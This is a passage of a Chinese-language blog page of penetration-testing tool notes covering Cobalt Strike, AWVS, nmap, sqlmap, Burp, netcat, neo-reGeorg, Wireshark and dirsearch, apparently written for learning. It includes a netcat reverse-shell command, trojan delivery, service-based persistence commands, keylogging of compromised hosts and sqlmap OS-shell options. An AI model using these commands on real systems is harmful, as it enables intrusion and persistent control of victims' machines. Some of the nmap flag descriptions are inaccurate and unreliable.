class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><br>    - target<br><br>    - weblog：web日志<br><br>  - attacks：<br><br>    - package：攻击方式<br>      - HTML application基于HTML攻击应用的载荷<br>      - MS office macro宏病毒<br>      - Payload Generator：生成payload<br>      - Windows Executable：生成exe后门对方运行即可上线<br>      - Windows Executable（s）：提供代理设置，内网攻击可能用到<br>    - Web Drive-by：<br>      - manage：肉鸡管理<br>      - clone site：克隆网站<br>      - Host file：指定文件夹到web里<br>      - Script web delivery：web攻击模块<br>      - signed applet attack：Java钓鱼<br>      - smark applet attack<br>      - system profile：客户端检测工具<br>    - spear Phish：钓鱼邮件<br><br>  - Reporting：生成报告栏<br><br>- 右击肉鸡<br><br>  - intetact:输入指令<br>    - 如果目标在域上面可以使用net computer查看计算机<br>    - net dclist查找域控<br>    - net domain_trusts域的信任情况<br>    - net logons<br>    - net share共享<br>    - <br>  - access:<br>    - make Token:创建一个虚拟用户<br>  - exploit:<br>    - Browser Pivot:监听浏览器以获取cookie<br>    - Desktop:监控桌面<br>    - File Browser:<br>      - ![image-20220218123725120](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-10.png)<br>    - port scan:扫描端口<br>    - process list:查看所有进程<br>    - screenshot:截屏幕<br>  - pivoting<br>    - socks server:使肉鸡创建代理<br>    - listeners:使肉鸡开启监听<br>  - session<br>    - sleep:命令反应时间<br>    - exit:关闭肉鸡<br>    - remove:移除肉鸡<br><br><br><br>### 用肉鸡来创建代理并连接到metasploit<br><br>![image-20220218121633689](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-11.png)<br><br><br><br><br><br>### 跳板攻击<br><br>![image-20220218121934998](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-12.png)<br><br>单击save就可以看见Listeners多了一个监听端口<br><br>![image-20220218122224254](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-13.png)<br><br>然后让其他内网直接连接这个ip:port即可 <br><br><br><br>### 监听浏览器输入<br><br>将进程添加到键盘记录<br><br>![image-20220218133049983](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-14.png)<br><br><br><br><br><br>打开全局的键盘监听<br><br>![image-20220218133152326](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-15.png)<br><br>然后就可以监听键盘记录了<br><br><br><br>### 提供下载木马地址并进行下载<br><br>首先生成一个木马<br><br>![image-20220218163434235](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-16.png)<br><br>设置监听的文件第二个图的file里选择木马，url里面的文件名称要和你的木马名称一致<br><br>![image-20220218163509654](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-17.png)<br><br>![image-20220218163554181](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-18.png)<br><br><br><br>launch后他给出下载文件的地址,复制即可下载运行即可上线<br><br>![image-20220218163757545](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-19.png)<br><br><br><br>### 维持化<br><br>首先生成一个木马<br><br>选择一个目录<br><br>upload [木马所在位置]这也就可以上传了<br><br>shell sc create &quot;服务名称&quot; -binpath=&quot;脚本全称(包含路径)&quot;<br><br>shell sc description &quot;服务名称&quot; &quot;服务的描述&quot;<br><br>shell sc config &quot;服务名称&quot; start=auto<br><br>shell net start &quot;服务名称&quot;<br><br><br><br>### 多层次的连接<br><br>方法一:<br><br>首先给添加一个tcp监听<br><br>![image-20220218171804604](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-20.png)<br><br>然后创建一个payload使用刚刚建立的tcp监听<br><br>![image-20220218171859961](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311932081.png)<br><br>然后上传到目标的内网服务器中并运行<br><br>然后使用肉鸡的命令行输入connect [目标的ip地址]<br><br>![image-20220218172009462](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-22.png)<br><br>方法二:<br><br>![image-20220218172823811](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/cobaltStrike-23.png)<br><br>首先使用肉鸡建立一个监听<br><br>生成payload 使用这个监听<br><br>然后让目标主机运行即可<br><br><br><br>特征过滤：https://kosakd.top/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/<br><br><br><br>## AWVS<br><br>AWVS是一款知名的自动化网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。它可以扫描任何可通过Web浏览器访问的和遵循HTTP/HTTPS规则的Web站点和Web应用程序。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。WVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。<br><br><br><br>&gt;pull 拉取下载镜像<br>&gt;docker pull secfa/docker-awvs<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;或者<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;docker pull secfa/awvs<br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span><br>&gt;将Docker的3443端口映射到物理机的 13443端口<br>&gt;docker run -it -d -p 13443:3443 secfa/docker-awvs<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;容器的相关信息<br>&gt;awvs13 username: admin@admin.com<br>&gt;awvs13 password: Admin123<br>&gt;AWVS版本：13.0.200217097<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;浏览器访问：https://127.0.0.1:13443/ 即可<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;注意了是HTTPS而不是HTTP<br><br>https://www.bilibili.com/video/BV1fz4y1U7tt?from=search&amp;seid=3146379149281441812&amp;spm_id_from=333.337.0.0<br><br>这上面最后一部分讲到了代码如何使用<br><br>## nmap<br><br>nmap：一款端口扫描工具<br><br>使用方法以及参数如下<br><br>==在这里$ 代表ip或者url==<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">nmap $</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">v</span>:显示详细信息</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">p</span>:指定端口</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">  - -p <span class="hljs-number">80</span>,<span class="hljs-number">8080</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">O</span>:扫描目标是什么操作系统,使用的什么协议</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -iL 文件:扫描指定文件的ip</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">V</span>:版本检测 用于扫描目标主机服务版本号. 探测打开的端口以确定服务/版本信息</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sA</span>:综合模式扫描</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sS</span>:安全模式扫描</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sL</span>:list扫描</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sT</span>:使用tcp扫描模式</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sF</span>:快速扫描</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sR</span>:<span class="hljs-variable constant_">RPC</span>扫描</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">sn</span>:测试存活主机</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">U</span>:测试那些udp开放</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">X</span>:表示以xml的格式输出结果到以文件</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">P</span>:ping探测</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-title class_">Pn</span>:跳过主机存活扫描过程</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">P0</span>:ip检测协议是否开启</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">- -<span class="hljs-attr">T</span>:设定模板(越高越快)</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">常用</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">nmap -sS $</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">nmap -sA -T <span class="hljs-number">4</span> $</span><br><br><br><br>## SQLmap<br><br>nginx /etc/nginx/nginx.conf<br><br><br><br>一款sql注入测试工具<br><br><br><br>sqlmap -r 文件名<br><br>sqlmap -u url或者域名<br><br>哪个位置需要进行注入就在哪个位置加==\*==,如下<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">sqlmap -u <span class="hljs-attr">http</span>:<span class="hljs-comment">//localhost/?id=111\*&amp;kkk=aaa</span></span><br><br>这样就可以对id进行注入了(文件中也一样)<br><br>下面是常用命令<br><br>&gt;- --dbs:获取所有的数库<br>&gt;- --current-db:获取当前的数据库<br>&gt;- --threads 10:开启10个线程<br>&gt;- --data id=111&amp;password=222:使用post提交,并且表单为id和password<br>&gt;- --tables -D &quot;库&quot;:获取指定数据库的所有表<br>&gt;- --columns -T &quot;表名称&quot; -D &quot;库名&quot;:获取指定库名的表中所有字段<br>&gt;- --dump -T &quot;表名称&quot; -D &quot;库名&quot; -C &quot;字段&quot;:获取指定按照指定的库名表名字段来获取数据库的数据<br>&gt;- --cookie:使用cookie<br>&gt;- --file-read&quot;读取的文件夹位置&quot;:读取某个文件<br>&gt;- --file-write &quot;绝对路径&quot;:写入文件到某个绝对路径中<br>&gt;- --batch:自动yes<br>&gt;- --risk 3:执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全<br>&gt;- --referer &quot;&quot;:使用referer欺骗<br>&gt;- --user-agent &quot;&quot;:自定义user-agent<br>&gt;- --proxy &quot;目标地址&quot;:使用代理注入<br>&gt;-  -v  详细的等级(0-6)<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">0</span>：只显示<span class="hljs-title class_">Python</span>的回溯，错误和关键消息。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">1</span>：显示信息和警告消息。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">2</span>：显示调试消息。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">3</span>：有效载荷注入。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">4</span>：显示<span class="hljs-variable constant_">HTTP</span>请求。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">5</span>：显示<span class="hljs-variable constant_">HTTP</span>响应头。</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">           <span class="hljs-number">6</span>：显示<span class="hljs-variable constant_">HTTP</span>响应页面的内容</span><br>&gt;- --os-shell(需要绝对路径和语言):获取shell<br><br><br><br>## Burp<br><br><br><br>是一个数据包捕获软件<br><br>首先我们可以设置代理<br><br>![image-20220122160622437](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-1.png)<br><br>然后去浏览器设置代理以火狐为例子<br><br>去设置里面的高级---网络---代理<br><br>![image-20220122161034011](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-2.png)<br><br>然后安装协议首先访问http://burp<br><br>然后下载证书,然后进入设置,高级---证书---证书机构---导入   这样导入证书<br><br>![image-20220122161254985](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-3.png)<br><br><br><br>#### 使用本地的DNS<br><br>![image-20220122161507557](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-4.png)<br><br><br><br>选择这个打开dns服务器,然后就可以使用并看到结果了<br><br>![image-20220122161604192](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-5.png)<br><br><br><br>当我们抓取到数据后就可以进行参数设置,当我们进行post提交的时候有时需要进行编码的调整如:==%00需要被编码否则传输过程中可能会丢失,而且%00进行base64时会被丢失==<br><br><br><br>![image-20220122162024999](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-6.png)<br><br>Send to Intruder和Send to Repeater的时候不能选择东西否则只会进行选择部分的测试<br><br><br><br>#### 首先介绍一下Send to Intruder    暴力破解<br><br>pikaqiu靶场<br><br>暴力破解第一题<br><br>首先单击请求进行请求<br><br>![image-20220119151356569](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-7.png)<br><br>然后抓到包后ctrl+i<br><br>![image-20220119151545986](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-8.png)<br><br><br><br>然后进入如下模块并对破解点进行添加<br><br>![image-20220119151700990](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-9.png)<br><br><br><br>![image-20220119154920801](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-10.png)<br><br>设置一个type然后进入payloads<br><br>![image-20220119155535580](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-11.png)<br><br>设置线程数量<br><br>![image-20220119155617982](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-12.png)<br><br>设置正则获取页面数据<br><br>![image-20220119155652450](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-13.png)<br><br><br><br>单机add设置正则<br><br>![image-20220119155849551](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-14.png)<br><br><br><br>![image-20220119160023712](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-15.png)<br><br><br><br>设置每次攻击前重新获取token就要进行重定向<br><br>![image-20220119160133327](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/tools-16.png)<br><br><br><br>## nc<br><br>一个进行远程命令控制的<br><br><br><br>黑客电脑的nc运行如下命令<br><br>nc -lvp [端口号]<br><br><br><br>靶机运行如下命令<br><br>nc -nv [ip] [端口] -e cmd.exe<br><br><br><br><br><br>&gt;- -l:将nc监听模式运行<br>&gt;- -k:接受一个请求不会结束而是继续监听<br><br><br><br>## neo-regeorg<br><br>生成一个有密码的脚本<br><br>python neoreg.py generate -k 密码<br><br>然后生成几个脚本，将脚本放到目标网站并且能访问到<br><br>python neoreg.py -k 密码 -u 网站的脚本位置<br><br>然后他会返回一个socket5的连接方法,将他设置为代理即可访问<br><br>## WireShark<br><br>![image-20220214133549383](https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/wireshark-1.png)<br><br> （1）Frame:  物理层的数据帧概况<br><br> （2）Ethernet II: 数据链路层以太网帧头部信息<br><br> （3）Internet Protocol Version 4: 互联网层IP包头部信息<br><br> （4）Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP<br><br> （5）Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议<br><br><br><br>过滤规则<br><br>ip==127.0.0.1<br><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">ip.<span class="hljs-property">dst</span>==<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>目的ip查询</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">ip.<span class="hljs-property">src</span>==<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>源ip查询</span><br><br><br><br>协议过滤<br><br>直接写协议即可如tcp,icmp,udp,http等<br><br>&gt;对协议内的内容进行过滤如:<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;http.request.method==&quot;POST&quot;<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;tcp.port=443<br><br><br><br>连接符<br><br>and/or/not<br><br><br><br>tcp三次握手<br><br>第一次发送数据包SYN=1,ACK=0<br><br>第二次接收数据包SYN=1,ACK=1<br><br>第三次发送数据包SYN=0,ACK=1<br><br><br><br>## Nessus<br><br>http://www.luckyzmj.cn/posts/477c90d0.html<br><br><br><br><br><br>## dirsearch<br><br>官网地址<br><br>https://github.com/maurosoria/dirsearch<br><br>直接使用python3 安装即可<br><br>&gt;pypi: pip3 install dirsearch<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;dirsearch -u url -e 框架类型(php,asp)<br><br><br><br>使用语法<br><br>&gt;Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]<br><span class="hljs-meta prompt_">&gt;</span><br>&gt;Options:<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"> --version             show program<span class="hljs-string">&#x27;s version number and exit</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string"> -h, --help            show this help message and exit</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string"> Mandatory:</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -u URL, --url=URL   Target URL</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -l FILE, --url-list=FILE</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Target URL list file</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --stdin             Target URL list from STDIN</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --cidr=CIDR         Target CIDR</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --raw=FILE          Load raw HTTP request from file (use `--scheme` flag</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       to set the scheme)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -e EXTENSIONS, --extensions=EXTENSIONS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Extension list separated by commas (Example: php,asp)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -X EXTENSIONS, --exclude-extensions=EXTENSIONS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Exclude extension list separated by commas (Example:</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       asp,jsp)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -f, --force-extensions</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Add extensions to every wordlist entry. By default</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       dirsearch only replaces the %EXT% keyword with</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       extensions</span></span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string"> Dictionary Settings:</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   -w WORDLIST, --wordlists=WORDLIST</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Customize wordlists (separated by commas)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --prefixes=PREFIXES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Add custom prefixes to all wordlist entries (separated</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       by commas)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --suffixes=SUFFIXES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       Add custom suffixes to all wordlist entries, ignore</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       directories (separated by commas)</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">   --only-selected     Remove paths have different extensions from selected</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">                       ones via `-e` (keep entries don&#x27;</span>t have extensions)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --remove-extensions</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Remove</span> extensions <span class="hljs-keyword">in</span> all paths (<span class="hljs-title class_">Example</span>: admin.<span class="hljs-property">php</span> -&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       admin)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -U, --uppercase     <span class="hljs-title class_">Uppercase</span> wordlist</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -L, --lowercase     <span class="hljs-title class_">Lowercase</span> wordlist</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -C, --capital       <span class="hljs-title class_">Capital</span> wordlist</span><br><span class="hljs-meta prompt_">&gt;</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"> <span class="hljs-title class_">General</span> <span class="hljs-title class_">Settings</span>:</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -t <span class="hljs-variable constant_">THREADS</span>, --threads=<span class="hljs-variable constant_">THREADS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Number</span> <span class="hljs-keyword">of</span> threads</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -r, --recursive     <span class="hljs-title class_">Brute</span>-force recursively</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --deep-recursive    <span class="hljs-title class_">Perform</span> recursive scan on every directory depth</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       (<span class="hljs-title class_">Example</span>: api/users -&gt; api/)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --force-recursive   <span class="hljs-title class_">Do</span> recursive brute-force <span class="hljs-keyword">for</span> every found path, not</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       only paths end <span class="hljs-keyword">with</span> slash</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --recursion-depth=<span class="hljs-variable constant_">DEPTH</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Maximum</span> recursion depth</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --recursion-status=<span class="hljs-variable constant_">CODES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Valid</span> status codes to perform recursive scan, support</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       ranges (separated by commas)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --subdirs=<span class="hljs-variable constant_">SUBDIRS</span>   <span class="hljs-title class_">Scan</span> sub-directories <span class="hljs-keyword">of</span> the given <span class="hljs-variable constant_">URL</span>[s] (separated by</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       commas)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-subdirs=<span class="hljs-variable constant_">SUBDIRS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> the following subdirectories during recursive</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       scan (separated by commas)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -i <span class="hljs-variable constant_">CODES</span>, --include-status=<span class="hljs-variable constant_">CODES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Include</span> status codes, separated by commas, support</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       ranges (<span class="hljs-title class_">Example</span>: <span class="hljs-number">200</span>,<span class="hljs-number">300</span>-<span class="hljs-number">399</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -x <span class="hljs-variable constant_">CODES</span>, --exclude-status=<span class="hljs-variable constant_">CODES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> status codes, separated by commas, support</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       ranges (<span class="hljs-title class_">Example</span>: <span class="hljs-number">301</span>,<span class="hljs-number">500</span>-<span class="hljs-number">599</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-sizes=<span class="hljs-variable constant_">SIZES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> responses by sizes, separated by commas</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       (<span class="hljs-title class_">Example</span>: 123B,4KB)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-texts=<span class="hljs-variable constant_">TEXTS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> responses by texts, separated by commas</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       (<span class="hljs-title class_">Example</span>: <span class="hljs-string">&#x27;Not found&#x27;</span>, <span class="hljs-string">&#x27;Error&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-regexps=<span class="hljs-variable constant_">REGEXPS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> responses by regexps, separated by commas</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       (<span class="hljs-title class_">Example</span>: <span class="hljs-string">&#x27;Not foun[a-z]&#123;1&#125;&#x27;</span>, <span class="hljs-string">&#x27;^Error$&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-redirects=<span class="hljs-variable constant_">REGEXPS</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> responses by redirect regexps or texts,</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       separated by commas (<span class="hljs-title class_">Example</span>: <span class="hljs-string">&#x27;https://okta.com/*&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --exclude-content=<span class="hljs-variable constant_">PATH</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Exclude</span> responses by response content <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span> path</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --skip-on-status=<span class="hljs-variable constant_">CODES</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       <span class="hljs-title class_">Skip</span> target whenever hit one <span class="hljs-keyword">of</span> these status codes,</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">                       separated by commas, support ranges</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --minimal=<span class="hljs-variable constant_">LENGTH</span>    <span class="hljs-title class_">Minimal</span> response length</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --maximal=<span class="hljs-variable constant_">LENGTH</span>    <span class="hljs-title class_">Maximal</span> response length</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   --max-time=<span class="hljs-variable constant_">SECONDS</span>  <span class="hljs-title class_">Maximal</span> runtime <span class="hljs-keyword">for</span> the scan</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">   -q, --quiet-mode    <span class="hljs-title class_">Quiet</span> 